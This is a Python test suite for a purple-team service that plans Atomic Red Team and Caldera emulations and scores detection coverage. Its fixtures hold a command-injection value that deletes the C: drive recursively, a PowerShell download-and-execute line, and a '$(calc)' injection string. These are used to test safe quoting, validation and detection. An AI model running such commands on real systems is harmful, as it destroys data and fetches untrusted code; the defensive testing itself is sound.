import io
import json
import re
import zipfile

import pytest
import yaml

from app.api.endpoints import parser
from app.schemas.cir import CIRSpecification
from app.services.purple_team import (
    PurpleTeamError,
    atomic_index,
    build_plan,
    parse_execution_log,
    render_invoke_atomic,
)

SYSMON = "Microsoft-Windows-Sysmon/Operational"
CIR = {
    "scenario_id": "purple'; Remove-Item C:\\ -Recurse\nInjected",
    "attack_graph": {"nodes": [
        {"step_id": "s1", "tactic": "TA0002", "technique": "T1059.001", "technique_name": "PowerShell", "target": "WS01",
         "action_type": "Execution", "evidence": [{"type": "process", "image": "powershell.exe", "command_line": "DownloadString"}]},
        {"step_id": "s2", "tactic": "TA0003", "technique": "T1547.001", "target": "WS01", "action_type": "Persistence",
         "evidence": [{"type": "registry", "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}]},
        {"step_id": "s3", "tactic": "TA0040", "technique": "T1486", "target": "FS01", "action_type": "Encryption",
         "evidence": [{"description": "files encrypted"}]},
    ], "edges": []},
}
TELEMETRY = [
    {"EventID": 1, "Channel": SYSMON, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "CommandLine": "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')"},
    {"EventID": 1, "Channel": SYSMON, "Image": "C:\\Windows\\notepad.exe", "CommandLine": "notepad"},
]
EXECUTION_LOG = (
    "Execution Time (UTC),Execution Time (Local),Technique,Test Number,Test Name,Hostname,IP Address,Username,GUID,ProcessId,ExitCode\n"
    "2026-11-24T10:00:00Z,x,T1059.001,1,Mimikatz,WS01,10.0.0.5,lab,f3132740-55bc-48c4-bcc0-758a459cd027,1,0\n"
    "2026-11-24T10:01:00Z,x,T1547.001,1,Reg Key Run,WS01,10.0.0.5,lab,e55be3fd-3521-4610-9d1a-e210e42dcf05,2,1\n"
)


def spec():
    return CIRSpecification(**CIR)


def test_plan_uses_atomic_index_and_parent_fallback():
    plan = build_plan(spec(), "windows")
    assert [s.technique for s in plan] == ["T1059.001", "T1547.001", "T1486"]
    assert plan[0].tests and all("windows" in t["platforms"] for t in plan[0].tests)
    assert len(atomic_index()) > 300
    with pytest.raises(PurpleTeamError):
        build_plan(spec(), "solaris")


def test_invoke_atomic_script_is_safely_quoted():
    plan = build_plan(spec(), "windows")
    script = render_invoke_atomic(spec(), plan, None)
    assert "Import-Module Invoke-AtomicRedTeam" in script
    assert "RUN ONLY IN AN ISOLATED LAB" in script
    assert f"Guid = '{plan[0].tests[0]['guid']}'" in script
    # scenario_id comes from user/LLM input: newlines are stripped so it stays a comment.
    header = [line for line in script.splitlines() if "scenario" in line][0]
    assert header.startswith("#") and "\nInjected" not in script.split("#Requires")[0].replace(header, "")
    rows = [line for line in script.splitlines() if "Name = " in line]
    assert rows
    # Every PowerShell string is single-quoted with embedded quotes doubled.
    assert all(re.search(r"Name = '(?:[^']|'')*' }", row) for row in rows)


def test_selected_guids_must_belong_to_plan():
    plan = build_plan(spec(), "windows")
    with pytest.raises(PurpleTeamError, match="not in this scenario"):
        render_invoke_atomic(spec(), plan, ["00000000-0000-0000-0000-000000000000"])
    with pytest.raises(PurpleTeamError, match="Invalid test GUID"):
        render_invoke_atomic(spec(), plan, ["$(calc)"])


def test_execution_log_parsers():
    executions = parse_execution_log("log.csv", EXECUTION_LOG.encode())
    assert [(e.technique, e.succeeded) for e in executions] == [("T1059.001", True), ("T1547.001", False)]
    caldera = {"steps": {"paw1": {"steps": [
        {"ability_id": "x", "attack": {"technique_id": "T1059.001"}, "status": 0, "run": "2026-11-24"},
        {"ability_id": "y", "attack": {"technique_id": "T1486"}, "status": 1},
    ]}}}
    parsed = parse_execution_log("report.json", json.dumps(caldera).encode())
    assert [(e.technique, e.succeeded) for e in parsed] == [("T1059.001", True), ("T1486", False)]
    with pytest.raises(PurpleTeamError):
        parse_execution_log("x.csv", b"a,b\n1,2\n")


# --- API ----------------------------------------------------------------------------

@pytest.fixture()
def purple(api_client, make_user, monkeypatch):
    async def fake_llm(_):
        return spec()

    monkeypatch.setattr(parser, "parse_narrative_to_cir", fake_llm)
    alice = make_user("alice")
    scenario_id = api_client.post("/api/v1/parse", json={"scenario": "x"}, headers=alice).json()["id"]
    dataset = api_client.post(
        "/api/v1/detection/datasets",
        data={"name": "lab-run", "label": "malicious", "technique_ids": "T1059.001,T1547.001"},
        files={"file": ("run.jsonl", "\n".join(json.dumps(e) for e in TELEMETRY), "application/json")},
        headers=alice,
    ).json()
    return alice, scenario_id, dataset["id"]


def test_plan_and_exports(api_client, purple):
    alice, scenario_id, _ = purple
    plan = api_client.get(f"/api/v1/purple/plan/{scenario_id}?platform=windows", headers=alice).json()
    assert plan["coverage"]["steps"] == 3
    script = api_client.post(f"/api/v1/purple/export/{scenario_id}", json={"format": "invoke-atomic"}, headers=alice)
    assert script.status_code == 200 and "Invoke-AtomicTest" in script.text
    assert script.headers["content-disposition"].endswith('.ps1"')

    guid = plan["steps"][0]["tests"][0]["guid"]
    bundle = api_client.post(
        f"/api/v1/purple/export/{scenario_id}",
        json={"format": "caldera", "platform": "windows", "test_guids": [guid]},
        headers=alice,
    )
    assert bundle.status_code == 200 and bundle.headers["content-type"] == "application/zip"
    archive = zipfile.ZipFile(io.BytesIO(bundle.content))
    abilities = [n for n in archive.namelist() if n.startswith("abilities/")]
    adversaries = [n for n in archive.namelist() if n.startswith("adversaries/")]
    assert len(abilities) == 1 and len(adversaries) == 1
    ability = yaml.safe_load(archive.read(abilities[0]))[0]
    adversary = yaml.safe_load(archive.read(adversaries[0]))
    assert adversary["atomic_ordering"] == [ability["id"]]
    assert ability["technique"]["attack_id"] == "T1059.001"
    assert f"-TestGuids {guid}" in ability["platforms"]["windows"]["psh"]["command"]
    bad = api_client.post(f"/api/v1/purple/export/{scenario_id}", json={"format": "caldera", "test_guids": ["nope"]}, headers=alice)
    assert bad.status_code == 400


def test_run_with_execution_log(api_client, purple):
    alice, scenario_id, dataset_id = purple
    response = api_client.post(
        "/api/v1/purple/runs",
        data={"scenario_id": scenario_id, "dataset_id": dataset_id, "platform": "windows"},
        files={"execution_log": ("Invoke-AtomicTest-ExecutionLog.csv", EXECUTION_LOG, "text/csv")},
        headers=alice,
    )
    assert response.status_code == 201, response.text
    run = response.json()
    status = {row["technique"]: row["status"] for row in run["techniques"]}
    assert status == {"T1059.001": "DETECTED", "T1547.001": "NOT_EXECUTED", "T1486": "NO_RULE"}
    assert run["summary"]["detection_rate"] == 1.0
    assert api_client.get(f"/api/v1/purple/runs?scenario_id={scenario_id}", headers=alice).json()[0]["id"] == run["id"]


def test_run_without_log_marks_unverified(api_client, purple):
    alice, scenario_id, dataset_id = purple
    run = api_client.post("/api/v1/purple/runs", data={"scenario_id": scenario_id, "dataset_id": dataset_id}, headers=alice).json()
    status = {row["technique"]: row["status"] for row in run["techniques"]}
    assert status["T1547.001"] == "UNVERIFIED" and run["summary"]["execution_log"] is False


def test_purple_resources_are_private(api_client, make_user, purple):
    alice, scenario_id, dataset_id = purple
    run = api_client.post("/api/v1/purple/runs", data={"scenario_id": scenario_id, "dataset_id": dataset_id}, headers=alice).json()
    mallory = make_user("mallory")
    assert api_client.get(f"/api/v1/purple/plan/{scenario_id}", headers=mallory).status_code == 404
    assert api_client.post(f"/api/v1/purple/export/{scenario_id}", json={"format": "invoke-atomic"}, headers=mallory).status_code == 404
    assert api_client.post("/api/v1/purple/runs", data={"scenario_id": scenario_id, "dataset_id": dataset_id}, headers=mallory).status_code == 404
    assert api_client.get(f"/api/v1/purple/runs/{run['id']}", headers=mallory).status_code == 404
    assert api_client.delete(f"/api/v1/purple/runs/{run['id']}", headers=mallory).status_code == 404
    assert api_client.get("/api/v1/purple/runs", headers=mallory).json() == []
    assert api_client.delete(f"/api/v1/purple/runs/{run['id']}", headers=alice).status_code == 200
